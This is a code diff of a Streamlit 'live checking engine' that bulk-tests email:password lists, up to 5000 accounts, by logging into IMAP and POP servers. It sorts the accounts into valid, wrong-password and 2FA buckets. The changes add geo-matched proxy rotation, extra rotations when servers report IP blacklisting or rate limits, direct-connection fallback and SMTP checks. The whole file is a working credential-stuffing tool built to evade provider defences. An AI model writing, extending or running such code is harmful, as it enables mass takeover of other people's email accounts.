+            country, region = geo_lookup(info["host"])
 
         with proxy_lock:
             if proxy_str not in proxy_meta:
-                proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": country, "region": region, "latency_ms": latency}
+                proxy_meta[proxy_str] = {"fails": 0, "success": 0}
             m = proxy_meta[proxy_str]
             if test_success:
                 m["success"] = m.get("success", 0) + 1
@@ -1077,18 +1228,16 @@ def get_available_countries_with_scores():
         country_scores = defaultdict(list)
         for p in raw:
             meta = proxy_meta.get(p, {})
-            c = meta.get("country", "Unknown").upper()
+            c = str(meta.get("country", "Unknown")).upper()
             if c == "UNKNOWN" or not c:
-                if "-country-" in p:
-                    try:
-                        c = p.split("-country-")[1].split(":")[0].upper()
-                    except Exception:
-                        c = "UNKNOWN"
+                info = parse_proxy(p)
+                if info:
+                    c = geo_lookup(info["host"])[0].upper()
             country_scores[c].append(meta.get("score", 50))
         ranked = sorted(((c, sum(s) / len(s)) for c, s in country_scores.items() if s), key=lambda x: x[1], reverse=True)
         return [c for c, _ in ranked if c != "UNKNOWN"] + (["UNKNOWN"] if "UNKNOWN" in country_scores else [])
     except Exception:
-        return ["US", "GB", "DE", "CA", "FR"]
+        return []
 
 
 if "pool_pick" not in str_lit.session_state:
@@ -1125,7 +1274,8 @@ else:
             for c in available_countries:
                 label = c
                 if choice == "mix":
-                    scores = [proxy_meta.get(p, {}).get("score", 0) for p in load_proxies() if str(proxy_meta.get(p, {}).get("country", "")).upper() == c]
+                    scores = [proxy_meta.get(p, {}).get("score", 0) for p in load_proxies()
+                              if str(proxy_meta.get(p, {}).get("country", "")).upper() == c]
                     label = f"{c}  score={max(scores) if scores else 0}"
                 if str_lit.checkbox(label, value=c in str_lit.session_state.picked_countries, key=f"poolchk_{choice}_{c}"):
                     picked.append(c)
@@ -1195,6 +1345,11 @@ def build_cfg():
         "PROXY_CONNECT_TIMEOUT": engine_config.connect_timeout,
         "FAST_MODE": engine_config.fast_mode,
         "FAILURE_COOLDOWN": engine_config.failure_cooldown,
+        # NEW
+        "RANDOM_ROTATION": proxy_random_rotation,
+        "GEO_CALL": geo_call_proxy,
+        "CONNECTION_HINT": my_connection,
+        "SMTP_CHECK": True,
     }
 
 
@@ -1220,6 +1375,7 @@ for _k, _v in (
     ("FAST_MODE", False), ("BLACKLIST_CF", 15), ("DEBUG", False), ("PROXY_TEST_FLIGHT", True),
     ("RETRY_CONNECTION_FAILED", 0), ("MAX_ACCOUNTS", 5000), ("MAX_WORKERS_START", 30),
     ("DYNAMIC_WORKER_SCALING", True), ("PROXY_MODE", "fallback"), ("ALLOW_BLACKLIST_IPS", False),
+    ("RANDOM_ROTATION", True), ("GEO_CALL", False), ("CONNECTION_HINT", "Auto"), ("SMTP_CHECK", True),
 ):
     CFG.setdefault(_k, _v)
 
@@ -1228,7 +1384,8 @@ log_startup(
     f"deadline={CFG.get('ACCOUNT_DEADLINE')}s timeout={CFG.get('TIMEOUT')}s "
     f"proxy_mode={CFG.get('PROXY_MODE')} hosts/domain={CFG.get('MAX_HOSTS_PER_DOMAIN')} "
     f"starttls={CFG.get('TRY_STARTTLS')} alt_user={CFG.get('TRY_ALT_USERNAME')} "
-    f"self_signed={CFG.get('ALLOW_SELF_SIGNED')} allow_blacklist={CFG.get('ALLOW_BLACKLIST_IPS')}"
+    f"self_signed={CFG.get('ALLOW_SELF_SIGNED')} allow_blacklist={CFG.get('ALLOW_BLACKLIST_IPS')} "
+    f"random_rotation={CFG.get('RANDOM_ROTATION')} geo_call={CFG.get('GEO_CALL')} smtp_check={CFG.get('SMTP_CHECK')}"
 )
 
 
@@ -1239,12 +1396,6 @@ log_startup(
 with str_lit.sidebar.expander("🎨 Theme Studio & Colours", expanded=False):
     th = str_lit.session_state.theme
 
-    # ------------------------------------------------------------------
-    # Pre-seed every widget-owned key BEFORE the widget is created, then
-    # create the widgets with NO default argument. This avoids both:
-    #   * "created with a default value but also had its value set" warning
-    #   * "cannot be modified after the widget is instantiated" error
-    # ------------------------------------------------------------------
     _preset_names = list(THEME_PRESETS.keys())
     _seed = {
         "th_preset": th.get("preset", "Aurora") if th.get("preset", "Aurora") in _preset_names else "Aurora",
@@ -1262,10 +1413,7 @@ with str_lit.sidebar.expander("🎨 Theme Studio & Colours", expanded=False):
         if _k not in str_lit.session_state:
             str_lit.session_state[_k] = _v
 
-    str_lit.selectbox(
-        "Preset Gradient", _preset_names,
-        key="th_preset", on_change=_on_preset_change,
-    )
+    str_lit.selectbox("Preset Gradient", _preset_names, key="th_preset", on_change=_on_preset_change)
 
     c_a, c_b = str_lit.columns(2)
     with c_a:
@@ -1278,7 +1426,6 @@ with str_lit.sidebar.expander("🎨 Theme Studio & Colours", expanded=False):
         str_lit.color_picker("Panel Surface", key="th_panel")
 
     str_lit.color_picker("Body Text", key="th_text")
-
     str_lit.slider("Corner Radius", 0, 28, key="th_radius")
 
     t_a, t_b = str_lit.columns(2)
@@ -1294,8 +1441,6 @@ with str_lit.sidebar.expander("🎨 Theme Studio & Colours", expanded=False):
 
     b_a, b_b = str_lit.columns(2)
     with b_a:
-        # on_click (NOT inline) -> runs before widgets are instantiated,
-        # so writing th_* keys inside it is legal.
         str_lit.button("♻️ Reset Theme", on_click=_reset_theme, use_container_width=True)
     with b_b:
         str_lit.download_button(
@@ -1309,7 +1454,6 @@ with str_lit.sidebar.expander("🎨 Theme Studio & Colours", expanded=False):
 
 _theme = str_lit.session_state.theme
 
-# Inject theme CSS, then draw the hero
 str_lit.markdown(theme_css(_theme), unsafe_allow_html=True)
 render_hero(_theme)
 
@@ -1345,8 +1489,6 @@ def proxy_is_blocked(proxy_str):
         return False
     if CFG.get("ALLOW_BLACKLIST_IPS", False):
         return False
-    if any(bp in proxy_str for bp in bad_proxies):
-        return True
     try:
         if proxy_str in circuit_breaker_until and time.time() < circuit_breaker_until[proxy_str]:
             return True
@@ -1358,6 +1500,8 @@ def proxy_is_blocked(proxy_str):
 def get_filtered_active_proxies(quiet: bool = False):
     try:
         raw = load_proxies(quiet=quiet)
+        if not raw:
+            return []
         filtered = []
         min_score = CFG.get("MIN_PROXY_SCORE", 10)
         mode = CFG.get("POOL_MODE", "all")
@@ -1373,11 +1517,11 @@ def get_filtered_active_proxies(quiet: bool = False):
             meta = meta_snapshot.get(p, {})
             if meta.get("score", 50) < min_score:
                 continue
-            country = meta.get("country", "Unknown").upper()
+            country = str(meta.get("country", "Unknown")).upper()
             if mode == "all":
                 filtered.append(p)
             elif mode == "us_only":
-                if "US" in country or "UNITED STATES" in country or "-country-US" in p:
+                if "US" in country or "UNITED STATES" in country:
                     filtered.append(p)
             elif mode == "country":
                 if any(cc in country or cc in p.upper() for cc in chosen_countries):
@@ -1421,6 +1565,8 @@ with str_lit.sidebar:
     str_lit.markdown("---")
     str_lit.markdown("### 🌐 Proxy Management & Health")
     str_lit.info(f"Loaded Proxies: **{len(all_proxies)}** | Filtered Pool: **{len(filtered_pool)}**")
+    if not all_proxies:
+        str_lit.caption("No proxies configured — the engine will run fully DIRECT until you add some.")
 
     with str_lit.expander("➕ Add Custom Proxies", expanded=False):
         custom_proxy_text = str_lit.text_area("Paste proxies (host:port or user:pass@host:port)", placeholder="123.45.67.89:8080", height=100)
@@ -1470,23 +1616,24 @@ with str_lit.sidebar:
                     warnings.warn(f"ThreadPool Webshare fetch error: {e}")
 
                 all_raw.extend(OXYLABS_PROXIES)
-                all_raw = list(dict.fromkeys(all_raw)) or OXYLABS_PROXIES[:]
+                all_raw = list(dict.fromkeys(all_raw))
 
                 alive = []
-                try:
-                    with ThreadPoolExecutor(max_workers=10) as ex:
-                        f2p = {ex.submit(test_single_proxy, p): p for p in all_raw}
-                        for fut in as_completed(f2p, timeout=15):
-                            try:
-                                if fut.result(timeout=2)[0]:
-                                    alive.append(f2p[fut])
-                            except Exception:
-                                continue
-                except Exception as e:
-                    warnings.warn(f"Proxy test batch error: {e}")
-                    alive = all_raw[:20]
+                if all_raw:
+                    try:
+                        with ThreadPoolExecutor(max_workers=16) as ex:
+                            f2p = {ex.submit(test_single_proxy, p): p for p in all_raw}
+                            for fut in as_completed(f2p, timeout=30):
+                                try:
+                                    if fut.result(timeout=2)[0]:
+                                        alive.append(f2p[fut])
+                                except Exception:
+                                    continue
+                    except Exception as e:
+                        warnings.warn(f"Proxy test batch error: {e}")
+                        alive = all_raw[:20]
 
-                alive = alive or all_raw[:20] or OXYLABS_PROXIES[:]
+                alive = alive or all_raw[:20]
 
                 try:
                     with file_write_lock:
@@ -1711,7 +1858,6 @@ def process_accounts(text, previous_valid):
             dns_fail_list.append(line); continue
         lines.append(f"{email}:{password}")
 
-    # One cache write for the whole batch instead of one per domain
     save_domain_cache()
 
     seen_email, clean = set(), []
@@ -1765,25 +1911,48 @@ if raw_text:
     ]):
         c.metric(lbl, val)
 
-    section_title("🔍", "Filter Categories Content Inspector")
-    filter_category_choice = str_lit.selectbox(
-        "Select category to inspect contents:",
-        options=["Ready to Check", "Resume Unfinished", "Disposables", "Typos",
-                 "Skip previously valid", "App-Skipped", "Custom Filtered", "DNS Failed"]
-    )
+    # ------------------------------------------------------------------
+    # SELECT CATEGORY TO INSPECT CONTENTS  (pre-filter buckets + result buckets)
+    # ------------------------------------------------------------------
+    section_title("🔍", "Filter & Result Categories Inspector",
+                  "inspect any bucket, including RETRY_LATER and SMTP Failed results")
+
+    RESULT_INSPECT = [
+        ("✅ Valid Found", "valid_results"),
+        ("❌ Wrong Password Found", "wrong_results"),
+        ("🔐 App Password / 2FA Found", "need_app_results"),
+        ("🕓 RETRY_LATER Found", "retry_results"),
+        ("📮 SMTP Failed Found", "smtp_results"),
+        ("🛰 DNS Failed Found", "dns_results"),
+        ("🔌 Connection Failed Found", "conn_results"),
+        ("❔ Unknown Found", "conn_results"),
+    ]
+
+    inspect_options = [
+        "Ready to Check", "Resume Unfinished", "Disposables", "Typos",
+        "Skip previously valid", "App-Skipped", "Custom Filtered", "DNS Failed",
+    ] + [label for label, _ in RESULT_INSPECT]
+
+    filter_category_choice = str_lit.selectbox("Select category to inspect contents:", options=inspect_options)
+
     unfinished_preview = []
     for run in list_unfinished_runs():
         unfinished_preview.append(f"{run.get('saved_at','')} | {run.get('reason','')} | left {len(run.get('remaining') or [])}")
         unfinished_preview.extend(run.get("remaining") or [])
+
     category_map = {
         "Ready to Check": clean_lines, "Resume Unfinished": unfinished_preview,
         "Disposables": disp, "Typos": typo, "Skip previously valid": resume,
         "App-Skipped": app_skip, "Custom Filtered": custom_skipped, "DNS Failed": dns_skipped,
     }
+    _label_to_key = dict(RESULT_INSPECT)
+    if filter_category_choice in _label_to_key:
+        category_map[filter_category_choice] = list(str_lit.session_state.get(_label_to_key[filter_category_choice], []))
+
     selected_list_items = category_map.get(filter_category_choice, [])
     if selected_list_items:
         str_lit.info(f"Showing **{len(selected_list_items)}** items for **{filter_category_choice}**:")
-        str_lit.code("\n".join(selected_list_items), language="text")
+        str_lit.code("\n".join(str(i) for i in selected_list_items), language="text")
     else:
         str_lit.info(f"No items in **{filter_category_choice}**.")
 
@@ -1829,8 +1998,6 @@ def detect_parent_provider(domain):
 
 
 def _location_tokens_from_mx(mx_records, domain):
-    """Zimbra sites are named zcs8-<site>-mta-mx7.<domain>; the <site> token
-    ('mvd') is reused by legacy aliases such as pop3-mvd.<domain>."""
     toks = []
     for mx in (mx_records or [])[:3]:
         for part in re.split(r"[.\-]", mx or ""):
@@ -1949,12 +2116,10 @@ def host_resolves(host):
 
 
 def _is_junk_host(host, domain):
-    """Delegates to hosts.py's router detector (catches zcs8-mvd-mta-mx7 etc.)."""
     return host_is_junk(host, domain)
 
 
 def _rank_hosts(hosts, domain):
-    """Delegates to hosts.py's composite ranking: tier -> DNS -> open port -> order."""
     return host_rank_hosts(hosts, domain)
 
 
@@ -1972,8 +2137,6 @@ def get_servers(email):
                 known["pop"] = _rank_hosts(known["pop"], domain)
             return known
 
-        # --- Cached discovery (24h). Without this, every single account re-runs
-        # MX + CNAME lookups and the run crawls on large lists. ---
         with cache_lock:
             cached = domain_cache.get(domain) or {}
         if cached.get("imap") and (time.time() - float(cached.get("ts", 0))) < DOMAIN_CACHE_TTL:
@@ -2014,21 +2177,37 @@ def get_servers(email):
 
 
 def refresh_alive_pool():
-    # Runs on the background 'alive-pool' thread -> quiet mode keeps it off
-    # st.session_state, which is what removes the ScriptRunContext flood.
+    """Parallel — previously one proxy at a time, which was the whole start lag."""
     try:
         raw = get_filtered_active_proxies(quiet=True)
     except Exception:
         raw = []
+    if not raw:
+        with alive_pool_lock:
+            alive_pool[:] = []
+        return
     if not CFG.get("PROXY_TEST_FLIGHT", True):
         with alive_pool_lock:
             alive_pool[:] = raw
+        enrich_proxy_geo(raw)
         return
-    live = [p for p in raw if precheck_proxy_fast(p)]
-    if not live:                       # every proxy 407'd / tunnelled badly — raw beats nothing
+    live = []
+    try:
+        with ThreadPoolExecutor(max_workers=16) as ex:
+            f2p = {ex.submit(precheck_proxy_fast, p): p for p in raw}
+            for fut in as_completed(f2p, timeout=45):
+                try:
+                    if fut.result():
+                        live.append(f2p[fut])
+                except Exception:
+                    continue
+    except Exception:
+        live = list(raw)
+    if not live:
         live = raw
     with alive_pool_lock:
         alive_pool[:] = live
+    enrich_proxy_geo(live)
 
 
 def start_alive_refresher():
@@ -2046,26 +2225,45 @@ def start_alive_refresher():
     threading.Thread(target=loop, daemon=True, name="alive-pool").start()
 
 
-def sample_alive_proxy(exclude=None):
-    """Random live proxy, never one already tried on this rung (unless it's all we have)."""
+def sample_alive_proxy(exclude=None, domain=None):
+    """Random rotation (default) or round-robin, with optional geo-call bias.
+
+    Geo-call NEVER hard-fails: matched nodes come first, everything else is the
+    fallback, and an excluded matched node simply drops out of the pool.
+    """
+    global _rr_index
     exclude = set(exclude or ())
     with alive_pool_lock:
         pool = [p for p in alive_pool if p and p not in exclude]
     if not pool:
         with alive_pool_lock:
             pool = [p for p in alive_pool if p]
-    return random.choice(pool) if pool else None
+    if not pool:
+        return None
+
+    if CFG.get("GEO_CALL", False) and domain:
+        want = tld_country(domain)
+        if want:
+            matched = [p for p in pool
+                       if str(proxy_meta.get(p, {}).get("country", "")).lower() == want.lower()]
+            if matched:
+                pool = matched
+
+    if CFG.get("RANDOM_ROTATION", True):
+        return random.choice(pool)
+
+    with _rr_lock:
+        _rr_index = (_rr_index + 1) % len(pool)
+        return pool[_rr_index]
 
 
-# --- Proxy tunnel probe (catches 407 before a node enters the live pool) ---
+# --- Proxy tunnel probe ---
 _tunnel_cache = {}
 _tunnel_lock = threading.Lock()
 _TUNNEL_TTL = 120
 
 
 def proxy_tunnel_ok(proxy_str, target=("imap.gmail.com", 993), timeout=3.0):
-    """Actually CONNECT through the proxy. A TCP-only check lets a 407 node into
-    the live pool where it then fails every single account on the ladder."""
     try:
         if not proxy_str:
             return True
@@ -2172,11 +2370,9 @@ def proxy_connect(host, port, proxy_str, timeout=None, remote_dns=True):
             return s
         except Exception as proxy_ex:
             last_err = proxy_ex
-            warnings.warn(f"Proxy connection failed ({proxy_ex}), attempting fallback...")
 
     if fast_fail_dns_check(host):
         try:
-            warnings.warn(f"All proxy routes failed for {host}:{port}. Initiating direct fallback connection.")
             direct_sock = socket.create_connection((host, port), timeout=effective_timeout)
             direct_sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
             direct_sock.settimeout(effective_timeout)
@@ -2227,7 +2423,6 @@ def tls_connect(host, port, proxy_str=None, insecure=True, timeout=None):
 
 # ============================================================================
 # PROTOCOL CLIENTS — override _create_socket(), NOT open()
-# (Python 3.13+ makes imaplib.IMAP4.file a read-only property)
 # ============================================================================
 
 class ProxyIMAP4SSL(imaplib.IMAP4_SSL):
@@ -2286,66 +2481,20 @@ def pop3_ok(resp):
 
 def classify_error(err, domain=""):
     try:
-        err_str = str(err).lower()
+        err_str = str(err)
         if domain in ZERO_ACCESS_PROVIDERS:
             return APP
-        if any(k in err_str for k in (
-            "application-specific password", "app password", "app-password", "app password required",
-            "basic authentication is disabled", "web login required", "log in via your web browser",
-            "web browser", "logindisabled", "login disabled", "two-factor", "2fa", "mfa",
-            "enable imap", "imap access is disabled",
-        )):
-            return APP
-        if any(k in err_str for k in (
-            "authenticationfailed", "authentication failed", "invalid credentials", "invalid login",
-            "invalid password", "invalid user name", "invalid username", "invalid user name or password",
-            "login failed", "auth failed", "bad username", "logon failure",
-            "username and password not accepted", "[auth]", "authenticate failed",
-            "login incorrect", "authenticate error", "authentication error",
-            "invalid login or password", "invalid username or password",
-            "pop3 user rejected", "pop3 password rejected", "login returned non-ok", "login non-ok",
-            "user rejected", "password rejected", "invalid token", "expired token",
-        )):
-            return WRONG
-
-        # NEW: server-side throttle / IP-block signals. Retryable — NOT the account's fault.
-        if any(k in err_str for k in (
-            "[alert]", "ip blacklisted", "blacklisted", "too many failed attempts",
-            "too many", "rate limit", "throttl", "try again", "temporarily",
-            "greylist", "server busy", "server is busy", "unavailable",
-            "over quota", "quota exceeded", "user could not be routed",
-        )):
-            return RETRY
-
-        if isinstance(err, ssl.SSLCertVerificationError):
-            return FAILED
-        if any(k in err_str for k in (
-            "certificate verify failed", "hostname mismatch", "certificate has expired",
-            "self signed certificate", "self-signed certificate", "bad file descriptor", "tlsv1",
-            "wrong version number", "eof occurred", "unexpected_eof", "no setter",
-            "tls not supported", "stls not supported", "407", "proxy authentication",
-            "proxy auth", "proxyconnect",
-        )):
-            return FAILED
-        if any(k in err_str for k in (
-            "proxy connect", "timed out", "timeout", "connection refused", "network is unreachable",
-            "name or service not known", "gaierror", "reset by peer", "broken pipe",
-            "fast-fail dns check failed", "socket.timeout", "connectionrefusederror", "unreachable",
-            "no route to host",
-        )):
-            return FAILED
+        return st_classify(err_str, domain)
     except Exception:
-        pass
-    return UNKNOWN
+        return UNKNOWN
 
 
 def _is_proxy_level_error(msg):
-    """True when the failure happened in the PROXY hop, not the mail server."""
-    s = (msg or "").lower()
-    return any(k in s for k in (
-        "407", "proxy authentication", "proxy auth", "proxyconnect",
-        "proxy connect", "proxy route", "bad proxy format", "socks",
-    ))
+    try:
+        return st_proxy_level(msg)
+    except Exception:
+        s = (msg or "").lower()
+        return any(k in s for k in ("407", "proxy auth", "proxy connect", "socks"))
 
 
 def record_proxy_attempt(proxy_str, success, is_network_error=False):
@@ -2373,14 +2522,64 @@ def record_proxy_attempt(proxy_str, success, is_network_error=False):
 
 
 # ============================================================================
+# SMTP FAILED CHECK
+# ============================================================================
+
+def smtp_failed_check(domain, px, trace_logs):
+    """Runs straight after the DNS fast-fail check.
+
+    Returns True (reachable), False (dead) or None (no candidate / unknown).
+    Never raises. A 220 banner is required for a pass, so a proxy that swallows
+    the connection cannot be mistaken for a healthy SMTP path.
+    """
+    if not CFG.get("SMTP_CHECK", True):
+        return None
+    try:
+        hosts = host_smtp_candidates(domain)
+    except Exception:
+        hosts = []
+    if not hosts:
+        trace_logs.append("SMTP failed check: no SMTP candidate hosts discovered")
+        return None
+
+    attempted = 0
+    for h in hosts[:2]:
+        if not fast_fail_dns_check(h):
+            trace_logs.append(f"SMTP failed check: {h} does not resolve locally")
+            continue
+        for port, use_tls in ((587, False), (465, True), (25, False)):
+            attempted += 1
+            s = None
+            try:
+                s = _raw_socket(h, port, px, timeout=min(6.0, max(3.0, float(CFG.get("TIMEOUT", 10)))))
+                if use_tls:
+                    s = _tls_context(h, False).wrap_socket(s, server_hostname=h)
+                s.settimeout(min(6.0, max(3.0, float(CFG.get("TIMEOUT", 10)))))
+                banner = s.recv(200)
+                if banner[:3] == b"220":
+                    trace_logs.append(f"SMTP failed check -> {px_tag(px)} {h}:{port} OK")
+                    return True
+                trace_logs.append(f"SMTP failed check -> {px_tag(px)} {h}:{port}: unexpected banner {banner[:40]!r}")
+            except Exception as e:
+                trace_logs.append(f"SMTP failed check -> {px_tag(px)} {h}:{port}: {str(e)[:90]}")
+            finally:
+                if s:
+                    try:
+                        s.close()
+                    except Exception:
+                        pass
+    if attempted:
+        trace_logs.append("SMTP failed check -> all SMTP candidates failed")
+        return False
+    trace_logs.append("SMTP failed check -> no reachable SMTP candidate")
+    return None
+
+
+# ============================================================================
 # ATTEMPT HELPERS
 # ============================================================================
 
 def username_candidates(email):
-    """Full address first (standard), then the bare local part.
-
-    Legacy ISP servers (Zimbra / cPanel / Dovecot that predate full-address
-    logins) authenticate on the local part only."""
     email = (email or "").strip()
     if not email:
         return [email]
@@ -2440,8 +2639,6 @@ def imap_starttls_once(email, password, server, proxy_str=None, insecure=True, p
 
 
 def imap_plain_once(email, password, server, proxy_str=None, port=143, attempt_timeout=None):
-    """Plaintext IMAP — some legacy / Zimbra servers refuse STARTTLS on 143 but
-    happily accept a cleartext LOGIN ('TLS not supported by server')."""
     to = attempt_timeout or CFG["TIMEOUT"]
     mail = None
     try:
@@ -2623,10 +2820,12 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
 
     t_start = time.time()
     retryable = False
+    dns_ok = True
+    smtp_state = {"value": None}
     try:
         if conf.get("type") == "zero_access":
             trace_logs.append("Architecture: Zero-Access / Bridge detected.")
-            return None, "need_app_password", "Zero-Access Architecture | Protocol: Local API / Bridge", None, trace_logs
+            return None, NEED_APP_PASSWORD, "Zero-Access Architecture | Protocol: Local API / Bridge", None, trace_logs
 
         proxy_mode = CFG.get("PROXY_MODE", "fallback")
         prefer_insecure = bool(CFG.get("ALLOW_SELF_SIGNED", True))
@@ -2635,7 +2834,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         max_hosts = max(1, int(CFG.get("MAX_HOSTS_PER_DOMAIN", 3)))
 
         budget = max(12.0, float(CFG.get("ACCOUNT_DEADLINE", 45)) * 0.9)
-        primary_deadline = t_start + (budget * 0.72)   # reserve ~28% for the direct retry
+        primary_deadline = t_start + (budget * 0.72)
         hard_deadline = t_start + budget
         per_attempt = max(3.0, min(float(CFG.get("TIMEOUT", 10)), budget / max(5.0, max_hosts + 3.0)))
 
@@ -2646,13 +2845,28 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         if proxy_pool and proxy_mode != "off":
             if proxy_mode == "sticky":
                 if not thread_state.get("sticky_proxy"):
-                    thread_state["sticky_proxy"] = sample_alive_proxy()
+                    thread_state["sticky_proxy"] = sample_alive_proxy(domain=domain)
                 px = thread_state["sticky_proxy"]
             else:
-                px = sample_alive_proxy()
+                px = sample_alive_proxy(domain=domain)
 
         imap_hosts = [h for h in (conf.get("imap") or [])[:max_hosts] if h]
         pop_hosts = [h for h in ((conf.get("pop") or conf.get("pop3") or [])[:1]) if h]
+
+        trace_logs.append(f"Host order -> IMAP {imap_hosts} | POP {pop_hosts}")
+
+        # ---------------- DNS FAST-FAIL CHECK ----------------
+        resolvable = [h for h in (imap_hosts + pop_hosts) if fast_fail_dns_check(h)]
+        dns_ok = bool(resolvable)
+        if dns_ok:
+            trace_logs.append(f"Fast-fail DNS check OK: {len(resolvable)}/{len(imap_hosts) + len(pop_hosts)} hosts resolve locally")
+        else:
+            trace_logs.append("Fast-fail DNS check failed: no candidate host resolves locally")
+            if not proxy_pool or proxy_mode == "off":
+                return None, DNS_FAILED, "Fast-fail DNS check failed: no host resolves locally", None, trace_logs
+
+        # ---------------- SMTP FAILED CHECK (right after DNS) ----------------
+        smtp_state["value"] = smtp_failed_check(domain, px, trace_logs)
 
         plan = [("IMAP", h, 993, "ssl") for h in imap_hosts]
         if try_starttls:
@@ -2666,8 +2880,6 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         if not plan:
             trace_logs.append("No candidate hosts for this domain.")
             return None, FAILED, "no candidate hosts", None, trace_logs
-
-        trace_logs.append(f"Host order -> IMAP {imap_hosts} | POP {pop_hosts}")
 
         timed_out_hosts = set()
 
@@ -2707,8 +2919,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                     trace_logs.append(f"{px_tag(px_used)} Skip {tls_mode.upper()} {server}:{port} (implicit TLS already timed out)")
                     continue
 
-                # Rotation budget for THIS rung: a dead proxy must not eat the whole ladder.
-                rotations_left = 3 if (px_used and proxy_mode != "off") else 0
+                rotations_left = 4 if (px_used and proxy_mode != "off") else 0
                 seen_px = {px_used} if px_used else set()
 
                 while True:
@@ -2746,7 +2957,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                             record_proxy_attempt(px_used, success=False, is_network_error=True)
                             trace_logs.append(f"{px_tag(px_used)} -> TIMEOUT {proto} {server}:{port}: {str(to_err)[:90]} [Classified: {FAILED}]")
                             server_level_fail = True
-                            rotate_now = True                      # a hang is a proxy symptom -> try another proxy
+                            rotate_now = True
 
                         except (socket.error, ConnectionRefusedError) as sock_err:
                             had_net_fail = True
@@ -2761,7 +2972,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                             trace_logs.append(f"{px_tag(px_used)} -> AUTH {proto} {server}:{port}: {str(proto_err)[:90]} [Classified: {st_val}]")
                             if st_val == APP:
                                 return (None, APP, f"{px_tag(px_used)} {proto} {server} -> {st_val}", px_used, trace_logs), had_net_fail, saw_retryable
-                            if st_val == RETRY:                    # IP blacklisted / too many attempts
+                            if st_val == RETRY:
                                 saw_retryable = True
                                 server_level_fail = True
                                 rotate_now = True
@@ -2803,7 +3014,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                             break
 
                     if rotate_now and px_used and rotations_left > 0:
-                        newpx = sample_alive_proxy(exclude=seen_px)
+                        newpx = sample_alive_proxy(exclude=seen_px, domain=domain)
                         if newpx and newpx not in seen_px:
                             seen_px.add(newpx)
                             px_used = newpx
@@ -2820,14 +3031,23 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
             return result
 
         if px and (net_fail or retryable) and (proxy_mode == "fallback" or CFG.get("RETRY_CONNECTION_FAILED")):
-            # Pick hosts that ACTUALLY resolve on the local resolver, not just the top-ranked ones.
+            # Resolving hosts only, and prefer IMAP over POP so we stop landing on pop.*
             direct_hosts = [h for h in imap_hosts if fast_fail_dns_check(h)]
             if not direct_hosts:
-                direct_hosts = [h for h in (conf.get("pop") or []) if fast_fail_dns_check(h)]
+                direct_hosts = [h for h in pop_hosts if fast_fail_dns_check(h)]
             if not direct_hosts:
                 direct_hosts = imap_hosts[:2]
+
             retry_plan = [("IMAP", h, 993, "ssl") for h in direct_hosts[:2]]
+            if try_starttls and direct_hosts:
+                retry_plan.append(("IMAP", direct_hosts[0], 143, "starttls"))
+
             if retry_plan:
+                dgeo = direct_geo()
+                vpn = CFG.get("CONNECTION_HINT", "Auto")
+                trace_logs.append(
+                    f"direct | {dgeo['ip']} | {dgeo['region']} | {dgeo['country']} | VPN {vpn}"
+                )
                 trace_logs.append("Proxy pass exhausted -> targeted DIRECT retry on locally-resolving hosts.")
                 result, _nf2, retryable2 = run_plan(None, plan_used=retry_plan, deadline_ts=hard_deadline,
                                                     attempt_to=max(4.0, per_attempt))
@@ -2845,6 +3065,10 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         failed_domain_cache[domain] = time.time()
     if retryable:
         return None, RETRY, "retryable (proxy / IP-block / rate-limit)", None, trace_logs
+    if smtp_state.get("value") is False:
+        return None, SMTP_FAILED, "SMTP failed check -> all SMTP candidates dead", None, trace_logs
+    if not dns_ok:
+        return None, DNS_FAILED, "Fast-fail DNS check failed: no host resolves locally", None, trace_logs
     return None, FAILED, "all hosts failed", None, trace_logs
 
 
@@ -2854,15 +3078,29 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
 
 section_title("🚀", "Execute Live Checking Engine", "proxy-backed, post-auth verified, resumable")
 
+RESULT_ACTION_MODES = [
+    ("🕓 RETRY_LATER Found", "retry_results"),
+    ("📮 SMTP Failed Found", "smtp_results"),
+    ("🔌 Connection Failed Found", "conn_results"),
+    ("❔ Unknown Found", "conn_results"),
+    ("✅ Valid Found", "valid_results"),
+    ("❌ Wrong Password Found", "wrong_results"),
+    ("🔐 App Password / 2FA Found", "need_app_results"),
+]
+
+ACTION_OPTIONS = (
+    ["Ready to Check", "Resume Unfinished", "Disposables", "Typos",
+     "Skip previously valid", "App-Skipped", "Custom Filtered", "DNS Failed"]
+    + [label for label, _ in RESULT_ACTION_MODES]
+)
+
 col_action1, col_action2 = str_lit.columns([0.65, 0.35])
 with col_action1:
     start_engine_btn = str_lit.button("🔥 Start Live Checking Engine", type="primary")
 with col_action2:
     engine_action_mode = str_lit.selectbox(
-        "Engine Action Mode:",
-        options=["Ready to Check", "Resume Unfinished", "Disposables", "Typos",
-                 "Skip previously valid", "App-Skipped", "Custom Filtered", "DNS Failed"],
-        index=0, help="Select the account category you would like the live checking engine to execute on."
+        "Engine Action Mode:", options=ACTION_OPTIONS, index=0,
+        help="Pick a pre-filter bucket OR a previous result bucket (including RETRY_LATER / SMTP Failed) to re-run."
     )
     unfinished_runs = list_unfinished_runs()
     unfinished_pick = None
@@ -2873,16 +3111,20 @@ with col_action2:
 active_proxy_pool = get_filtered_active_proxies()
 
 if start_engine_btn:
-    filtered_pool[:] = get_filtered_active_proxies()
-    start_alive_refresher()
-    refresh_alive_pool()
+    # ---- INSTANT FEEDBACK: the bar exists BEFORE any heavy work -------------
+    progress_bar = str_lit.progress(0, text=f"Initializing checking engine for [{engine_action_mode}]...")
+    status_text = str_lit.empty()
+    status_text.info("⏳ Opening the engine… resolving hosts, pre-testing the proxy pool, geo-tagging nodes.")
+
     log_startup(f"Live checking engine execution triggered in [{CFG['MODE_NAME']}] mode on category: [{engine_action_mode}].")
     log_startup(
         f"RUN CONFIG -> workers={CFG.get('MAX_WORKERS_START')} deadline={CFG.get('ACCOUNT_DEADLINE')}s "
